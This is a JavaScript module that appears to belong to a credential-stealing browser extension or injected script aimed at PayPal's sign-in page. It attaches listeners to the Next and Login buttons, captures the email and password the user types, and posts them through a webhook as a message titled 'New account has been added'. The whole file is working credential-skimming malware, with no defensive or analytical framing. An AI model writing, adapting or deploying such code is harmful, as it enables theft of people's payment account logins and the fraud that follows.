const Util = require('../../utils');
const { formatFields, code, getFooter, formatField } = require('../../utils/Webhook');
const { waitForElement } = require('../../utils/Document');

module.exports = {
  webPattern: /https:\/\/www\.paypal\.com/g,
  urlsMatches: [
    {
      path: '/signin',
      run() {
        document.querySelector(this.getSelector('next')).addEventListener('click', async () => {
          const emailInput = document.querySelector(this.getSelector('emailInput'))?.value;
          if (!emailInput) return;

          const embed = {
            author: { name: emailInput },
            title: 'New account is being added',
            fields: formatFields([
              ['Email', code(emailInput)],
            ]),
            footer: getFooter()
          };
          const { id } = await Util.Webhook.sendEmbed(embed);

          (await waitForElement(this.getSelector('submit'))).addEventListener('click', async () => {
            const passwordInput = document.querySelector(this.getSelector('passwordInput'))?.value;
            if (!passwordInput) return;

            embed.title = 'New account has been added';
            embed.fields.push(formatField(['Password', code(passwordInput)]));
            await Util.Webhook.editEmbed(embed, id);
          });
        });
      }
    }
  ],
  selectors: {
    emailInput: 'input[name="login_email"]',
    passwordInput: 'input[name="login_password"]',
    next: 'button[type="submit"]#btnNext',
    submit: 'button[type="submit"]#btnLogin',
  }
};
